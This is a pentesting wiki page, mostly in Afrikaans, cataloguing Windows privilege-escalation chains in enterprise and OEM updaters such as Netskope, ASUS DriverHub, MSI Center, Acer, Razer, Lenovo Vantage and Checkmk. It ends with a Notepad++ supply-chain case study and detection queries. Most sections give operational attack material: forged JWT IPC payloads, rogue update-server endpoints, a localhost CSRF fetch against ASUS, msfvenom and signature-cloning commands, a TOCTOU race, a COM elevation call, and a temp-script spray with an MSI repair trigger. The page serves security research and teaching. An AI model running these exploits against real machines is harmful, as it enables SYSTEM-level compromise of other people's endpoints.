# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy generaliseer 'n klas van Windows local privilege escalation kettings wat gevind word in enterprise endpoint agents en updaters wat 'n low-friction IPC-oppervlak en 'n privileged update flow blootstel. 'n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar 'n low-privileged user 'n enrollment na 'n attacker-controlled server kan afdwing en dan 'n malicious MSI kan lewer wat die SYSTEM service installeer.

Sleutel-idees wat jy teen soortgelyke produkte kan hergebruik:
- Abuse 'n privileged service se localhost IPC om re-enrollment of reconfiguration na 'n attacker server af te dwing.
- Implementeer die vendor se update endpoints, lewer 'n rogue Trusted Root CA, en wys die updater na 'n malicious, “signed” package.
- Ontduik weak signer checks (CN allow-lists), optional digest flags, en lax MSI properties.
- As IPC “encrypted” is, lei die key/IV af uit world-readable machine identifiers wat in die registry gestoor is.
- As die service callers beperk volgens image path/process name, inject in 'n allow-listed process of spawn een suspended en bootstrap jou DLL via 'n minimal thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Baie agents ship 'n user-mode UI process wat met 'n SYSTEM service oor localhost TCP kommunikeer met JSON.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft 'n JWT enrollment token wie se claims die backend host beheer, bv. AddonUrl. Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC message wat die provisioning command invoke met jou JWT en tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou rogue server tref vir enrollment/config, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As caller verification pad/naam-gebaseer is, laat die request kom van ’n allow-listed vendor binary (sien §4).

---
## 2) Hijacking the update channel om code as SYSTEM uit te voer

Sodra die client met jou server praat, implementeer die verwagte endpoints en stuur dit na ’n attacker MSI. Tipiese volgorde:

1) /v2/config/org/clientconfig → Gee JSON config terug met ’n baie kort updater interval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gee 'n PEM CA-sertifikaat terug. Die diens installeer dit in die Local Machine Trusted Root store.
3) /v2/checkupdate → Verskaf metadata wat na 'n kwaadwillige MSI en 'n vals weergawe wys.

Bypassing common checks seen in the wild:
- Signer CN allow-list: die diens mag net die Subject CN kontroleer en seker maak dit is “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan 'n leaf met daardie CN uitreik en die MSI teken.
- CERT_DIGEST property: sluit 'n onskadelike MSI property genaamd CERT_DIGEST in. Geen enforcement tydens installasie nie.
- Optional digest enforcement: config flag (bv. check_msi_digest=false) skakel ekstra cryptographic validation af.

Result: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrêre code uit as NT AUTHORITY\SYSTEM.

Patch-bypass lesson: as 'n vendor reageer deur 'n klein stel “trusted” domains te allow-list in plaas daarvan om die update source cryptographically te authenticate, soek vir vendor-owned redirectors of reverse proxies wat jou steeds traffic laat steer. In Netskope se geval het public follow-up research gewys dat 'n R129-era allow-list steeds misbruik kon word via `rproxy.goskope.com`, wat attacker-controlled Azure App Service content geproxied het. Behandel hostname allow-lists as 'n speed bump, nie as 'n trust boundary nie.

---
## 3) Forging encrypted IPC requests (when present)

Vanaf R127 het Netskope IPC JSON in 'n encryptData field toegedraai wat soos Base64 lyk. Reversing het gewys AES met key/IV afgelei van registry values wat vir enige user leesbaar is:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers kan encryption reproduseer en geldige encrypted commands vanaf 'n standard user stuur. Algemene wenk: as 'n agent skielik sy IPC “encrypt”, kyk vir device IDs, product GUIDs, install IDs onder HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Sommige dienste probeer die peer authenticate deur die TCP connection se PID op te los en die image path/name te vergelyk met allow-listed vendor binaries wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese bypasses:
- DLL injection in 'n allow-listed process (bv. nsdiag.exe) en proxy IPC van binne dit.
- Spawn 'n allow-listed binary suspended en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver-enforced tamper rules te bevredig.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products ship dikwels met 'n minifilter/OB callbacks driver (bv. Stadrv) om gevaarlike rights van handles na protected processes te stroop:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

'n Betroubare user-mode loader wat hierdie constraints respekteer:
1) CreateProcess van 'n vendor binary met CREATE_SUSPENDED.
2) Verkry handles wat jy steeds mag hê: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die process, en 'n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy code op 'n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of 'n ander vroeë, gewaarborgde gemapte thunk) met 'n klein stub wat LoadLibraryW op jou DLL path roep, en dan terug spring.
4) ResumeThread om jou stub in-process te trigger, en jou DLL te laai.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op 'n reeds protected process gebruik het nie (jy het dit self geskep), word die driver se policy bevredig.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiseer 'n rogue CA, kwaadwillige MSI signing, en bedien die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is 'n custom IPC client wat arbitrêre (opsioneel AES-encrypted) IPC messages skep en die suspended-process injection insluit om van 'n allow-listed binary te originate.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wanneer jy 'n nuwe endpoint agent of motherboard “helper” suite teëkom, is 'n vinnige workflow gewoonlik genoeg om te bepaal of jy na 'n belowende privesc-target kyk:

1) Enumereer loopback listeners en map hulle terug na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Lys kandidaat-naamspipes op:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) My register-gebaseerde routingdata wat deur plugin-gebaseerde IPC servers gebruik word:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Onttrek eers endpoint name, JSON keys, en command IDs uit die user-mode client. Packed Electron/.NET frontends lek dikwels die volle schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Soek vir die werklike trust-predikaat, nie net die kodepad wat uiteindelik die proses begin nie:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrone wat die moeite werd is om te prioriseer:
- `CryptQueryObject`/sertifikaat-ontleding sonder `WinVerifyTrust` beteken gewoonlik “sertifikaat bestaan” is behandel as “sertifikaat is trusted”, wat sertifikaat-kloning of ander fake-signer truuks moontlik maak.
- Substring-/suffix-kontroles oor `Origin`, `Referer`, download URLs, process names, of signer CNs is nie authentication nie. `contains(".vendor.com")` is gewoonlik exploitbaar met attacker-controlled lookalike domains.
- As die low-privileged GUI besluit “the file is trusted” en die SYSTEM broker net daardie resultaat verbruik, om die client-side DLL/JS te patch of te reimplement often omseil die boundary heeltemal (Razer-style split validation).
- As die broker ’n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan van daardie pad af valideer of schedule, toets onmiddellik vir TOCTOU replacement vensters en vir sibling plugin modules wat alternate `ExecuteTask()` wrappers met swakker kontroles blootstel.

Vir targets wat swaar op named-pipes staatmaak, is PipeViewer ’n vinnige manier om weak DACLs en remotely reachable pipes raak te sien voordat jy die protocol in diepte begin reverse.

As die target callers net by PID, image path, of process name authenticate, behandel dit as ’n speed bump eerder as ’n boundary: injecting in die legitimate client, of die connection vanaf ’n allow-listed process maak, is dikwels genoeg om die server se checks te bevredig. Vir named pipes spesifiek, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) dek die primitive meer in diepte.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

’n Nuwe variasie wat die moeite werd is om te jag, is die **signed-client RPC broker**: ’n low-privileged Lenovo-signed desktop process praat met ’n SYSTEM service, en die service route JSON commands in ’n stel XML-described add-ins onder `%ProgramData%`. Sodra code execution **binne enige geaccepteerde signed client** bereik is, word elke `runas="system"` contract deel van jou attack surface.

High-value primitives wat in Lenovo Vantage research waargeneem is:
- **Trusting the caller because it is signed by the vendor**: researchers het ’n authenticated context bereik deur ’n Lenovo-signed EXE na ’n writable directory te kopieer en ’n DLL side-load (`profapi.dll`) te bevredig sodat arbitrary code binne ’n client geloop het wat die service reeds trusted.
- **Manifest-driven attack surface discovery**: add-ins word gedefinieer onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; verskeie contracts loop as `SYSTEM`, so om daardie manifests te inventariseer onthul dikwels die werklike privileged verbs vinniger as om die broker self te reverse.
- **Per-command bugs behind the authenticated channel**: sodra jy binne die trusted client is, het public research path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, en substring-based registry path checks ontdek wat writes buite die bedoelde hive moontlik gemaak het.

Nuttige recon op ’n target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktiese wegneemete: wanneer ’n helper-suite ’n broker blootstel wat eers die **caller process** autentifiseer en eers daarna in dosyne plugin/add-in commands dispatch, moenie ophou nadat jy die front-door trust check omseil het nie. Dump die manifest/contract table en fuzz elke high-privilege verb independently; die authenticated channel verberg gewoonlik verskeie second-stage bugs.

---
## 1) Browser-to-localhost CSRF teen privileged HTTP APIs (ASUS DriverHub)

DriverHub ship ’n user-mode HTTP service (ADU.exe) op 127.0.0.1:53000 wat browser calls verwag wat van https://driverhub.asus.com af kom. Die origin filter voer eenvoudig `string_contains(".asus.com")` uit oor die Origin header en oor download URLs wat deur `/asus/v1.0/*` blootgestel word. Enige attacker-controlled host soos `https://driverhub.asus.com.attacker.tld` slaag dus die check en kan state-changing requests vanaf JavaScript stuur. Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir addisionele bypass patterns.

Praktiese flow:
1) Registreer ’n domain wat `.asus.com` embed en host ’n malicious webpage daar.
2) Gebruik `fetch` of XHR om ’n privileged endpoint (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` te roep.
3) Stuur die JSON body wat die handler verwag – die packed frontend JS wys die schema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI hieronder getoon slaag wanneer die Origin-header gespoof word na die vertroude waarde:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Enige browser-besoek aan die attacker site word dus ’n 1-click (of 0-click via `onload`) local CSRF wat ’n SYSTEM helper dryf.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrary executables af wat in die JSON body gedefinieer is en cache hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation hergebruik dieselfde substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` word aanvaar. Ná download, kyk ADU.exe net of die PE ’n signature bevat en of die Subject string ooreenstem met ASUS voor dit run – geen `WinVerifyTrust`, geen chain validation.

Om die flow te weaponize:
1) Skep ’n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS se signer daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op ’n `.asus.com` lookalike domain en trigger UpdateApp via die browser CSRF hierbo.

Omdat beide die Origin en URL filters substring-based is en die signer check net strings vergelyk, trek DriverHub die attacker binary en execute dit onder sy elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM service expose ’n TCP protocol waar elke frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die core component (Component ID `0f 27 00 00`) ship `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy handler:
1) Kopieer die supplied executable na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verify die signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL CO., LTD.” en `WinVerifyTrust` slaag).
3) Skep ’n scheduled task wat die temp file as SYSTEM run met attacker-controlled arguments.

Die gekopieerde file is nie gelock tussen verification en `ExecuteTask()` nie. ’n Attacker kan:
- Stuur Frame A wat wys na ’n legitimate MSI-signed binary (waarborg die signature check slaag en die task word ge-queue).
- Race dit met herhaalde Frame B messages wat na ’n malicious payload wys, en `MSI Center SDK.exe` oorskryf net ná verification klaar is.

Wanneer die scheduler fire, execute dit die oorskryfde payload onder SYSTEM ten spyte daarvan dat die original file gevalideer is. Betroubare exploitation gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU window gewen is.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang ’n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor word. Die eerste 4 bytes van ’n frame kies daardie component, wat attackers toelaat om commands na arbitrary modules te route.
- Plugins kan hul eie task runners definieer. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` en call direk `API_Support.EX_Task::ExecuteTask()` met **geen signature validation** – enige local user kan dit na `C:\Users\<user>\Desktop\payload.exe` point en deterministiese SYSTEM execution kry.
- Sniffing loopback met Wireshark of die .NET binaries in dnSpy instrument quickly reveal die Component ↔ command mapping; custom Go/ Python clients kan dan frames replay.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, en sy discretionary ACL laat remote clients toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Stuur command ID `7` met ’n file path en dit invoke die service se process-spawning routine.
- Die client library serialize ’n magic terminator byte (113) saam met args. Dynamic instrumentation met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumentation tips) wys dat die native handler hierdie value na ’n `SECURITY_IMPERSONATION_LEVEL` en integrity SID map voor dit `CreateProcessAsUser` call.
- Vervang 113 (`0x71`) met 114 (`0x72`) en dit val in die generic branch wat die full SYSTEM token behou en ’n high-integrity SID stel (`S-1-16-12288`). Die spawned binary run dus as unrestricted SYSTEM, beide locally en cross-machine.
- Kombineer dit met die exposed installer flag (`Setup.exe -nocheck`) om ACC selfs op lab VMs op te stel en die pipe sonder vendor hardware te exercise.

Hierdie IPC bugs highlight hoekom localhost services mutual authentication moet enforce (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en hoekom elke module se “run arbitrary binary” helper dieselfde signer verifications moet share.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 het nog ’n useful pattern by hierdie family gevoeg: ’n low-privileged user kan ’n COM helper vra om ’n process through `RzUtility.Elevator` te launch, terwyl die trust decision aan ’n user-mode DLL (`simple_service.dll`) gedelegeer word eerder as om robust binne die privileged boundary enforced te word.

Observed exploitation path:
- Instantiate die COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` om ’n elevated launch aan te vra.
- In die public PoC word die PE-signature gate inside `simple_service.dll` gepatch voor die request gestuur word, wat toelaat dat ’n arbitrary attacker-chosen executable gelaunch word.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Algemene kernpunt: wanneer jy “helper”-suites reverse, moenie by localhost TCP of named pipes ophou nie. Kyk vir COM classes met name soos `Elevator`, `Launcher`, `Updater`, of `Utility`, en verifieer dan of die bevoorregte diens werklik die teiken binary self valideer of bloot `n resultaat vertrou wat deur `n patchable user-mode client DLL bereken is. Hierdie patroon strek verder as Razer: enige split design waar die high-privilege broker `n allow/deny-besluit van die low-privilege kant verbruik, is `n kandidaat privesc surface.


---
## Voorspelbare temp script execution tydens MSI repair (Checkmk Agent / CVE-2024-0670)

Sommige Windows agents implementeer steeds bevoorregte aksies deur `n tydelike `.cmd` na `C:\Windows\Temp` te skryf en dit as `SYSTEM` uit te voer. As die filename voorspelbaar is en die diens nie bestaande files veilig her-skep nie, kan `n low-privileged gebruiker die toekomstige temp file vooraf skep as **read-only** en maak dat die bevoorregte proses attacker-controlled content uitvoer in plaas van sy eie script.

Waargeneem in vulnerable Checkmk Agent builds:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** van die cached agent package

Praktiese workflow:
1. Skat `n realistiese PID-reeks vanaf current process IDs of die running agent PID.
2. Skryf `n kort **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` of `cmd.exe` redirection; vermy UTF-16 PowerShell output vir batch files).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` oor die candidate range en merk elke file read-only.
4. Trigger `n repair van die cached MSI sodat die bevoorregte diens probeer om die temp script te regenereer en dan uit te voer.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
As die kwesbare produk met Windows Installer geïnstalleer is, map die lukraak-lykende gekaste MSI onder `C:\Windows\Installer` terug na sy produknaam voor die herstel geaktiveer word:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operasionele notas:
- `qwinsta` is useful wanneer `msiexec /fa` faal vanaf ’n nie-interaktiewe WinRM shell en jy moet verstaan of ’n bestaande desktop/disconnected session die repair korrek kan trigger.
- Hierdie patroon generaliseer na ander endpoint agents en updaters wat **temp scripts in world-writable locations stage en dit later as SYSTEM execute**. Toets vir predictable names, missing exclusive create semantics, en repair/update flows wat on demand getrigger kan word.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Tussen June 2025 en December 2025 het attackers wat die hosting infrastructure agter die Notepad++ update flow compromised het, selektief malicious manifests aan gekose victims bedien. Ouer WinGUp-based updaters het update authenticity nie volledig geverify nie, so ’n hostile XML response kon clients na attacker-controlled URLs redirect. Omdat die client HTTPS content aanvaar het sonder om beide ’n trusted certificate chain en ’n valid PE signature op die downloaded installer af te dwing, het victims ’n trojanized NSIS `update.exe` fetched en executed.

Operasionele flow (geen local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting en antwoord update checks met attacker metadata wat na ’n malicious download URL wys.
2. **Trojanized NSIS**: die installer fetch/execute ’n payload en abuse twee execution chains:
- **Bring-your-own signed binary + sideload**: bundle die signed Bitdefender `BluetoothService.exe` en drop ’n malicious `log.dll` in sy search path. Wanneer die signed binary run, sideload Windows `log.dll`, wat die Chrysalis backdoor decrypt en reflectively load (Warbird-protected + API hashing om static detection te hinder).
- **Scripted shellcode injection**: NSIS execute ’n compiled Lua script wat Win32 APIs (bv. `EnumWindowStationsW`) gebruik om shellcode te inject en Cobalt Strike Beacon te stage.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** van die downloaded installer (pin vendor signer, reject mismatched CN/chain) en sign die update manifest self (bv. XMLDSig). Block manifest-controlled redirects tensy validated.
- Treat **BYO signed binary sideloading** as ’n post-download detection pivot: alert wanneer ’n signed vendor EXE ’n DLL name van buite sy canonical install path load (bv. Bitdefender wat `log.dll` van Temp/Downloads load) en wanneer ’n updater installers van temp drop/execute met non-vendor signatures.
- Monitor **malware-specific artifacts** observed in hierdie chain (bruikbaar as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes na `%TEMP%`, en Lua-driven shellcode injection stages.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die returned XML is nou signed (XMLDSig), en newer builds enforce certificate + signature verification van die downloaded installer in plaas daarvan om slegs die transport te vertrou.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat 'n nie-Notepad++ installeerder begin</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone veralgemeen na enige updater wat unsigned manifests aanvaar of versuim om installer signers vas te pen—network hijack + malicious installer + BYO-signed sideloading lewer remote code execution onder die dekmantel van “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
